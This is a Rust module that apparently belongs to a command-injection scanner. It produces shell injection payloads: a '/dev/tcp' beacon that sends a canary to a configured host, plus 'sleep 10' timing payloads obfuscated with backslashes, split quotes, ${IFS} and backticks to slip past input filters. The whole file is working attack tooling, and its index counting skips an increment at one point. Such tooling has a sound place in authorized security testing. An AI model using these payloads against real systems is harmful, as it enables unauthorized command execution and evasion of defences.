use super::Injector;

pub fn sh_obf(v: &Vec<u8>) -> Vec<u8> {
    let mut out = vec![];
    for x in v {
        if *x != 32 {
            out.extend(b"\\");
        }
        out.push(*x);
    }
    return out;
}


pub fn inj(inj: &Injector, mut ith: u64, n: u64) -> Result<Vec<u8>, u64> {
    if let (Some(host), Some(port)) = (&inj.host, inj.port()) {
        if ith == n {
            let mut out = b"echo \"GET /".to_vec();
            out.extend(inj.canary(ith));
            out.extend(b"HTTP\" > /dev/tcp/");
            out.extend(host);
            out.extend(b"/");
            out.extend(port);
            return Ok(out);

        }
        ith += 1;
    }
    if let (Some(host), Some(port)) = (&inj.host, inj.port()) {
        if ith == n {
            let mut out = b"`echo \"GET /".to_vec();
            out.extend(inj.canary(ith));
            out.extend(b"HTTP\" > /dev/tcp/");
            out.extend(host);
            out.extend(b"/");
            out.extend(port);
            out.extend(b"`");
            return Ok(out);

        }
        ith += 1;
    }
    if ith == n {
        return Ok(b"sleep 10".to_vec());
    }
    ith += 1;
    if ith == n {
        return Ok(sh_obf(&b"sleep 10".to_vec()));
    }
    ith += 1;
    if ith == n {
        return Ok(b"`sleep 10`".to_vec());
    }
    ith += 1;
    if ith == n {
        return Ok(b"sl'ee'p 10".to_vec());
    }
    ith += 1;
    if ith == n {
        return Ok(b"`sl'ee'p 10`".to_vec());
    }


    if ith == n {
        return Ok(b"sleep${IFS}10".to_vec());
    }
    ith += 1;
    if ith == n {
        return Ok(b"`sleep${IFS}10`".to_vec());
    }
    ith += 1;
    if ith == n {
        return Ok(b"sl'ee'p${IFS}10".to_vec());
    }
    ith += 1;
    if ith == n {
        return Ok(b"`sl'ee'p${IFS}10`".to_vec());
    }

    Err(ith)
}
